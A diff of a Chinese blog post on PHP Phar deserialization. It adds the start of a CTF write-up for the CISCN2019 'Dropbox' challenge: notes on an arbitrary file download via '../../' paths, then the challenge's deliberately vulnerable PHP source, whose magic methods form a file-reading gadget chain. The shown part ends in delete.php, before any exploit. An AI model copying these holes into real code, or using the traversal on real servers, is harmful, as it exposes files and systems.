@@ -384,14 +384,14 @@ Phar的简述phar是什么?Phar归档最好的特点是可以方便地将多个�
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    818
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    9 分
                 </div>
                 
 				
@@ -453,7 +453,250 @@ file_get_contents(&quot;phar://./test.phar/test.txt&quot;);
 <h4 id="发生反序列化原因"><a href="#发生反序列化原因" class="headerlink" title="发生反序列化原因"></a>发生反序列化原因</h4><p>在使用phar://协议读取文件时，文件会被解析成phar<br>解析过程中会触发php_var_unserialize()函数对meta-data的操作，造成反序列化。<br>一般情况下，利用Phar反序列漏洞有几个条件：</p>
 <pre><code>可以上传Phar文件
 有可以利用的魔术方法
-文件操作函数的参数可控</code></pre>
+文件操作函数的参数可控</code></pre><h3 id="CISCN2019-Dropbox"><a href="#CISCN2019-Dropbox" class="headerlink" title="CISCN2019-Dropbox"></a>CISCN2019-Dropbox</h3><h4 id="phar和pop链的利用姿势（参考-CISCN2019-华北赛区-Day1-Web1-Dropbox）"><a href="#phar和pop链的利用姿势（参考-CISCN2019-华北赛区-Day1-Web1-Dropbox）" class="headerlink" title="phar和pop链的利用姿势（参考[CISCN2019 华北赛区 Day1 Web1]Dropbox）"></a>phar和pop链的利用姿势（参考[CISCN2019 华北赛区 Day1 Web1]Dropbox）</h4><p>地址：<a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox" target="_blank" rel="noopener">buuctf/dropbox</a><br>这题套路差不多，也是phar触发的反序列化，每次比赛都有这样的题。。。这题没啥说的，主要是细心。<br>随便注册个账号，直接登录进去，有三个功能：上传、下载、删除。肯定要试试任意下载，果然有一个。先试了passwd验证了之后想开始找目录，找了半天发现用../../index.php就行了。<br>下载源码分析几个主要的文件，分别是class.php、download.php和delete.php。<br>class.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
+<span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
+<span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
+<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span>
+<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>
+        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>
+        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>
+            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>
+            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>download.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>delete.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
+
+<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
